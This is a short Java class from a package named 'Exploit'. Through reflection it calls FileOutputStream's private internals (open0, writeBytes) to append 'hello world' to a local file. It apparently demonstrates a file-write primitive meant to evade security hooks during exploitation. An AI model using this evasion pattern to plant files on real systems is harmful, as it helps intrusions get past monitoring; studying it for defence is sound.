package top.racerz.Exploit;

import java.io.Closeable;
import java.io.FileDescriptor;
import java.io.FileOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class FileWrite {
    private String result;

    public FileWrite() throws Exception {
        String path = "C:\\Users\\lenovo\\Desktop\\1.txt";
        String content = "hello world";

        try {
            FileOutputStream proxyFos = new FileOutputStream(path);
            // 转换成字节
            byte[] contentBytes = content.getBytes();

            Class<?> fos = Class.forName("java.io.FileOutputStream");
            // this.append = append;
            Field field = fos.getDeclaredField("append");
            field.setAccessible(true);
            // 避免覆盖写
            field.set(proxyFos, true);

            // this.fd = new FileDescriptor();
            Field field1 = fos.getDeclaredField("fd");
            field1.setAccessible(true);
            field1.set(proxyFos, new FileDescriptor());

            // fd.attach(this);
            Class<?> fd = Class.forName("java.io.FileDescriptor");
            Method fd_method = fd.getDeclaredMethod("attach", Closeable.class);
            fd_method.setAccessible(true);
            fd_method.invoke(proxyFos.getFD(), proxyFos);

            // open0(name, append);
            Method m = fos.getDeclaredMethod("open0", String.class, Boolean.TYPE);
            m.setAccessible(true);
            m.invoke(proxyFos, path, true);

            Method m2 = fos.getDeclaredMethod("writeBytes", byte[].class, Integer.TYPE, Integer.TYPE, Boolean.TYPE);
            m2.setAccessible(true);
            m2.invoke(proxyFos, contentBytes, 0, contentBytes.length, true);

            Method m3 = fos.getDeclaredMethod("close");
            m3.setAccessible(true);
            m3.invoke(proxyFos);

            this.result = "文件写入成功";
        } catch (Exception e) {
            this.result = "出现错误，文件写入可能失败！";
        }

        this.echo();
    }

    public void echo() throws Exception {

    }

    public static void main(String[] args) throws Exception {
        new FileWrite();
    }
}
